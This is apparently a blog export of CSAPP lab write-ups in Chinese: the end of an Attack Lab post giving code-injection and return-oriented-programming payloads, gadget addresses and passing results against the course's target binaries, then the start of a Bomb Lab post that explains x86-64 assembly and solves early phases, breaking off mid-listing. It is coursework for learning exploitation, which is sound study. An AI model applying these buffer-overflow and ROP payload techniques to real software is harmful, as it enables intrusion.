<p>其中<code>sprintf</code>函数是格式化输出到s， <code>strncmp</code>是比较两个字符串， 且最多比较9位（比9位的原因是cookies只有八位数字+一个<code>0x0</code>）。 我们的任务就是进入到touch3函数中去，且保证传入的参数能满足hexmatch(cookies, sval) == 1, 也就是传入的字符串是cookies的字符串表达形式。即把每个数字转化成其对应的ascii码。我的cookies<code>0x59b997fa</code>转化成ascii码是<code>35 39 62 39 39 37 66 61 00</code></p>
<p>这里的问题首先是cookies的存放位置，如果存放在buf中的话，调用hexmatch的时候可能会覆盖，但是buf的父堆栈是安全的。所以我们把touch3的地址放在父堆栈的顶部即可。根据level2我们已经得到 %rsp = 0x5561dc78，那么返回地址就是%rsp + 0x28 ， 然后字符串地址应该是 %rsp + 0x30 = 0x5561dca8。 所以注入代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure></p>
<p>然后转化成对应的机器码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c level3.s</span><br><span class="line">objdump -d level3.o &gt; level3.byte</span><br></pre></td></tr></table></figure></p>
<p>得到的level3.byte内容是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level3.o:     file format elf64-x86-64</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dc98,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
<p>所以我们应该输入的字符串就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8</span><br><span class="line">dc 61 55 68</span><br><span class="line">fa 18 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
<p>利用hex2raw转化后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
<h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h1><p>在<code>rtarget</code>程序中使用了两个技术来防止上面的溢出攻击</p>
<ul>
<li>栈随机化，我们没有办法确定需要跳转的地址</li>
<li>栈不可执行</li>
</ul>
<p>那么现在该如何攻击呢，就可以利用已有的可执行的代码来完成攻击操作，也就是return-oriented programming(ROP), 其含义就是找到现存代码中可以利用的指令（这些指令后面要跟着ret) ，这些代码也成为gadget 小工具</p>
<p><img src="/images/CSAPP/attacklab-gadget.jpg" alt="attacklab-gadget"></p>
<p>这样每次执行完当前的gadget时，最后的ret都会跳转到下一个gadget。通过这样的不断跳转来完成我们想要实现的操作。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;</span><br><span class="line">	*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的反汇编代码是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7  movl $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3</span><br></pre></td></tr></table></figure>
<p>这其中的<code>48 89 c7</code>就恰好编码了<code>movq %rax, %rdi</code>的指令。所以这段代码就包含了一个gadget，起始地址是<code>0x400f18</code></p>
<p>实验指导书中提供了一些常用的指令的字节码</p>
<p><img src="/images/CSAPP/attacklab-%E5%AD%97%E8%8A%82%E7%A0%81.JPG" alt="attacklab-字节码"></p>
<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>要求用ROP的方法实现传递cookie（<code>0x59b997fa</code>）到touch2（<code>0x4017ec</code>)。我们的思路是</p>
<ol>
<li>把cookie放到<code>%rdi</code>中</li>
<li>把touch2地址放到栈中</li>
<li><p>ret以开始执行</p>
<p>通过反汇编我们找到了一些可以使用的gadget片段</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401999:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  40199f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>首先如何把cookies传递到%rdi中，最直接的方法是先把cookies存到%rsp中，再<code>pop %rdi</code> 但是没有找到对应的字节码<code>5d c3</code>。所以只能退而求其次，先把cookies存到别的寄存器中，在mov给%rdi，所以就找<code>5[8-f] c3</code>的字节码。在地址<code>0x4019ab</code>中找到了<code>58 90 c3</code>(因为90对应的指令是nop，所以不影响)，是<code>pop %rax</code> 。这个可以作为我们的gadget1。</p>
<p>找到gadget1之后考虑把%rax的值赋给%rdi，查表知道我们需要找<code>movq %rax, %rdi</code>即<code>48 89 c7</code>，搜索了一下在地址<code>0x4019c5</code>找到。这个作为我们的gadget2。最后还需要把touch2的地址放入栈即可。执行完gadget2之后就会把touch2的地址出栈然后执行touch2的函数。</p>
<p>所以我们需要构造的一个栈结构就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">0x4017ec            &lt;== touch2的地址</span><br><span class="line">0x4019c5(gadget2)   </span><br><span class="line">0x59b997fa(cookies) &lt;== %rsp</span><br><span class="line">0x4019ab(gadget1)   &lt;== 覆盖原来的返回地址</span><br><span class="line">...                 &lt;== 缓冲区</span><br><span class="line">栈顶</span><br></pre></td></tr></table></figure></p>
<p>所以输入的字符就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
<p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
<h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><p>Level5大致思路是</p>
<ol>
<li>将cookies的字符串表达形式放到某个位置，把地址赋值给%rdi</li>
<li>将touch3函数地址入栈</li>
</ol>
<p>这里我们需要把cookies字符串放在栈的最底部，然后利用rsp和cookies的相对位置得到其地址。首先需要拿到rsp存放的地址，把这个地址加上cookies在stack中的偏移量，pop到某个寄存器中。</p>
<p>所以首先寻找与mov %rsp相关的代码(48 89 e[0-7])，在<code>0x401aad</code>找到了<code>48 89 e0</code>即<code>movq %rsp, %rax</code>，作为我们的gadget1。 接下来需要找一个可以增加%rax的代码，在<code>0x4019d8</code>找到了<code>04 37 c3</code>表示<code>add $0x37, %al</code>， 作为我们的gadge2。接下来需要把rax赋值给rdi，在level4中我们已用过这个gadget了，其地址为<code>0x4019c5</code>。</p>
<p>所以我们的栈结构就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">cookies的字符表示    &lt;== 在RSP+55 的位置放置cookies</span><br><span class="line">...   （这里需要多少位的填充？  55 - 3 * 8 = 31字节）</span><br><span class="line">0x4018fa            &lt;== touch3的地址</span><br><span class="line">0x4019c5(gadget3)   &lt;== movq %rax, %rdx</span><br><span class="line">0x4019d8(gadget2)   &lt;== add $0x37, %rax</span><br><span class="line">0x401aae(gadget1)   &lt;== movq %rsp, %rax 覆盖原来的返回地址，这里的位置标记为RSP</span><br><span class="line">...                 &lt;== 缓冲区</span><br><span class="line">栈顶</span><br></pre></td></tr></table></figure>
<p>这里填充cookies和touch3之间的地址需要多少位遇到了些麻烦，一开始我觉得应该<code>55 - 4 * 8 = 23</code>字节的，但是因为执行gadget1这句指令的时候，%rsp已经指向下一个指令的地址了，所以应该是减去<code>3 * 8</code>。</p>
<p>而我的cookies<code>0x59b997fa</code>转化成ascii码是<code>35 39 62 39 39 37 66 61 00</code>。所以答案就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00 </span><br><span class="line">d8 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>得到结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>起初做Attack Lab的时候对程序调用的栈帧结构理解还不是很深，所以做到level3的时候就卡住坐不下去了。一直等到做完cachelab才又回来认真做了一下attack lab。通过这个实验，脑海中栈帧结构那张图更加清晰，也理解了代码注入攻击和ROP攻击的原理。</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP-Bomb Lab]]></title>
      <url>/2018/01/29/CSAPP/Bomb_Lab/</url>
      <content type="html"><![CDATA[<p>第二个实验主要涉及到的知识是机器指令，如何使用汇编语言进行流程控制、过程调用（函数调用）数据存储等。要使用gdb 或者 objdump等工具完成对bomb程序的拆弹，一共需要输入六个phase，输入正确则进入下个关卡，输入错误则炸弹爆炸。</p>
<a id="more"></a>
<h1 id="汇编背景知识"><a href="#汇编背景知识" class="headerlink" title="汇编背景知识"></a>汇编背景知识</h1><h2 id="操作符的含义"><a href="#操作符的含义" class="headerlink" title="操作符的含义"></a>操作符的含义</h2><table>
<thead>
<tr>
<th>类型</th>
<th>语法</th>
<th>例子</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>常量</td>
<td>符号<code>$</code>开头</td>
<td>$-42, $0x15213</td>
<td>要注意是十进制还是十六进制</td>
</tr>
<tr>
<td>寄存器</td>
<td>符号<code>%</code>开头</td>
<td><code>%esi</code>, <code>%rax</code></td>
<td>可能存储值或者地址</td>
</tr>
<tr>
<td>内存地址</td>
<td>括号括起来</td>
<td><code>(%rbx)</code>, <code>0x1c(%rax)</code></td>
<td>括号实际上是寻址的意思</td>
</tr>
</tbody>
</table>
<h2 id="寄存器的用途"><a href="#寄存器的用途" class="headerlink" title="寄存器的用途"></a>寄存器的用途</h2><ul>
<li><code>%rax</code>作为函数返回值使用</li>
<li><code>%rsp</code>栈指针寄存器，指向栈顶</li>
<li><code>%rdi, %rsi, %rdx, %rcx, %r8, %r9</code>作为函数参数，依次对应第1参数，第二参数。。。</li>
<li><code>%rbx, %rbp, %r12, %r13, %r14, %r15</code>作为数据存储，遵循caller-saved，调用子函数之前需要备份防被修改</li>
<li><code>%r10, %r11</code> 作为数据存储，遵循callee-saved，要在子函数中使用之前需要先保存原值</li>
</ul>
<blockquote>
<p>caller-saved registers(volatile registers) are used to hold temporary quantities that need not to be preserved across calls. For that reason, it is the caller’s responsibility to push these registers onto the stack if it wants to restore this value after a procedure call. callee-saved registers( non-volatile registers) are used to hold long-lived values that should be preseved across calls. When the caller makes a procedure call, it can expect that those registers will hold the same value after the callee returns, making it the responsibility of the callee to save them and restore them before returning to the caller.</p>
</blockquote>
<h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mov %rbx, %rdx</code></td>
<td><code>rdx = rbx</code></td>
</tr>
<tr>
<td><code>add (%rdx), %r8</code></td>
<td><code>r8 += rdx</code></td>
</tr>
<tr>
<td><code>lea (%rdx, %rbx, 2), %rdx</code></td>
<td><code>rdx = rdx + rbx * 2</code></td>
</tr>
<tr>
<td><code>cmp %rbx, %rdx</code></td>
<td><code>计算rdx - rbx的值，并置位</code></td>
</tr>
<tr>
<td><code>test a, a</code></td>
<td><code>a &amp; a</code></td>
</tr>
</tbody>
</table>
<p>这里要注意比较运算的顺序，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmpl %r9, %r10</span><br><span class="line">jg   8675309</span><br></pre></td></tr></table></figure></p>
<p>等同于<code>if %r10 &gt; %r9, jump to 8675309</code></p>
<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>phase_1 函数的汇编语言为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x0000000000400ee0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:	mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:	test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:	je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>由于phase_1函数只有一个<code>char*</code>类型的参数，则其参数存放在rsi和rdi中， 程序将0402400赋值给rsi寄存器，然后调用了strings_not_equal函数，可以猜测得第一个实验就是将输入的phase和存放在0x402400处的phase相对比。 则通过<code>print (char *) 0x402400</code> 可以得到内存0x402400位置存放的语句是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *) 0x402400</span><br><span class="line">$2 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>
<p>则第一关的答案就是 Border relations with Canada have never been better.</p>
<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p>phase_2的汇编语言是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x0000000000400efc &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:	push   %rbx  # 压栈保存rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:	sub    $0x28,%rsp # 预留出空间作为缓冲区</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:	mov    %rsp,%rsi  # 将rsp赋值给rsi, rsi会作为read_six_numbers的参数，读取到的数字会存放在(rsi)中</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:	callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:	cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:	je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:	jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:	mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:	je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:	add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:	cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:	jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:	jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:	lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:	lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:	jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:	pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:	pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>首先会调用一个函数read_six_numbers，结果会放在(rsp)中</p>
<ol>
<li>把第一个数与0x01对比，如果相等则跳转到phase_2 + 52, 把第二个数赋值给%rbx寄存器，把最后一个数字赋值给rbp, <code>lea 0x18(%rsp) %rbp</code>，因为每个int是4字节。然后跳转到phase_2 + 27。</li>
<li>将之前一个数赋值给%eax，把%eax乘二，然后对比eax和rbx，如果不相等则会爆炸。如果相等则跳转到phase_2 + 41, 执行<code>add $0x4, %rbx</code>会把rbx移动到下一个数字，然后<code>cmp %rbp, %rbx</code>是判断是否到了最后一个数。如果已经到达了最后一个数则跳转到phase_2 + 64 结束函数。如果没有到达则继续循环。</li>
</ol>
<p>则通过上面的逻辑可判断出第二个level的答案应该是一个等比序列。 1 2 4 8 16 32</p>
<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x0000000000400f43 &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:	lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:	mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:	cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:	jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:	ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:	mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:	jmpq   *0x402470(,%rax,8)</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:	mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:	mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:	mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:	mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:	mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:	mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:	mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:	mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:	cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:	je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:	